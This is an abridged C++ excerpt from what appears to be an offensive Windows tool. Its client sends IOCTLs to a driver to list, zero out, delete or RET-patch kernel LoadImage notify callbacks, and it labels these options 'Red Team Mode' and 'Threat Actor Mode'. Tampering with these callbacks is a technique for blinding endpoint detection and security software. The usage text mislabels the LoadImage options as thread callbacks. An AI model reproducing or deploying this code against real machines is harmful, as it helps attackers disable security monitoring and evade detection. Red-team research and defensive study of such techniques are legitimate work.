...
void Usage()
{
	...
	printf("  -l\t\tProcess, Thread & LoadImage Notify Callbacks Address's List.\n");
	...
	printf("<LoadImage Callbacks>\n");
	printf("  -zl\t\tZero out Thread Notify Callback's Array (Cowboy Mode).\n");
	printf("  -dl <index>\tDelete Specific Thread Notify Callback (Red Team Mode).\n");
	printf("  -pl <index>\tPatch Specific Thread Notify Callback (Threat Actor Mode).\n");
	printf("  -rl <index>\tRollback to the original Thread Notify Callback (Thoughtful Ninja Mode).\n");
}
...
void DisplayInfo(BYTE* buffer, DWORD size) {
	...
	bool thread_flag = 0;
	bool thread_flag_temp = 0;
	bool loadimage_flag = 0;
	while (count > 0)
	{
		...
		if ((thread_flag == 0) & (index < index_comp)) {
			printf("[*] Thread Callbacks\n");
			thread_flag = 1;
		}

		if ((index <= index_prev) & (loadimage_flag == 1)) {
			printf("[*] LoadImage Callbacks\n");
		}
...
int main(int argc, const char* argv[]) {
	...
	if (strcmp(argv[1], "-zl") == 0)
	{
		InputBuffer.remove = 1;
		success = DeviceIoControl(hDevice, IOCTL_EVIL_LOADIMAGE_ZEROOUT_ARRAY, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
	}
	...
	else if (strcmp(argv[1], "-pl") == 0)
	{
		...
		{
			printf("Patching index: %d with a RET (0xc3)\n", InputBuffer.index);
			success = DeviceIoControl(hDevice, IOCTL_EVIL_LOADIMAGE_CALLBACK_RET, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
		}
		else
			printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
	}
	...
	else if (strcmp(argv[1], "-rl") == 0)
	{
		...
		{
			printf("Rolling back patched index: %d to the original values\n", InputBuffer.index);
			success = DeviceIoControl(hDevice, IOCTL_EVIL_LOADIMAGE_ROLLBACK_RET, &InputBuffer, sizeof(InputBuffer), nullptr, 0, &lpBytesReturned, nullptr);
		}
		else
			printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
	}
	...
	{
		printf("Removing index: %d\n", InputBuffer.index);
		success = DeviceIoControl(hDevice, IOCTL_EVIL_LOADIMAGE_DELETE_CALLBACK, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
	}
	else
		printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
	}
